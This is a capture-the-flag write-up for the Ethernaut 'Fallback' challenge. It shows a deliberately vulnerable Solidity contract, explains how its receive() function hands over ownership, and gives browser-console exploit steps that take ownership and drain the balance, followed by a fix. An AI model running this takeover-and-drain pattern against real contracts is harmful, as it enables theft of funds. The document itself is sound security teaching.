# Level 01 — Fallback

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {
  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] = contributions[msg.sender].add(msg.value);
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

---

## Objective
Claim ownership of the contract and drain its balance.

---

## Vulnerability

**Type:** Fallback Function Ownership Takeover  
**Severity:** Critical  
**SWC:** SWC-105 (Unprotected Ether Withdrawal)

### What's Wrong

The `receive()` fallback function changes `owner` to `msg.sender` if two conditions are met:
1. `msg.value > 0` — the call sends some ETH
2. `contributions[msg.sender] > 0` — the caller has contributed before

This means **any address that has contributed even 1 wei can become owner** simply by sending ETH directly to the contract. Ownership change — a critical privilege — is hidden in a fallback function with almost no barrier.

### Root Cause
Ownership transfer logic placed in a fallback function with weak guards instead of being gated behind proper access control or a minimum contribution matching the owner's initial amount (1000 ETH).

---

## Exploit

### Step by Step
1. Call `contribute()` with a tiny amount (e.g., 1 wei) to satisfy `contributions[msg.sender] > 0`
2. Send ETH directly to the contract to trigger `receive()`
3. You are now owner
4. Call `withdraw()` to drain the contract

### In Browser Console (Ethernaut)
```javascript
// Step 1 — make a small contribution
await contract.contribute({value: toWei('0.0001')})

// Step 2 — trigger the fallback / receive function
await sendTransaction({from: player, to: contract.address, value: toWei('0.0001')})

// Step 3 — verify ownership
await contract.owner() // should return your address

// Step 4 — drain
await contract.withdraw()
```

### Foundry Exploit (see ../foundry-exploits/test/FallbackExploit.t.sol)

---

## Fix

```solidity
// Remove the ownership change from receive()
// If ETH needs to be received, just accept it without changing state

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    // ❌ REMOVE: owner = msg.sender;
}

// Ownership transfer should only happen through a proper function
// with strong guards — e.g., contribution exceeding current owner's
function claimOwnership() public {
    require(contributions[msg.sender] > contributions[owner], "Not enough contribution");
    owner = msg.sender;
}
```

---

## Key Lesson

> Never put critical state changes (especially ownership transfer) in fallback or receive functions. Fallback functions execute on any ETH transfer — they are a high-risk surface area that should contain minimal logic.

**Check every `receive()` and `fallback()` function for unexpected state changes.**

---

## Status
- [ ] Solved on Ethernaut
- [ ] Foundry exploit written
- [ ] Added to GitHub
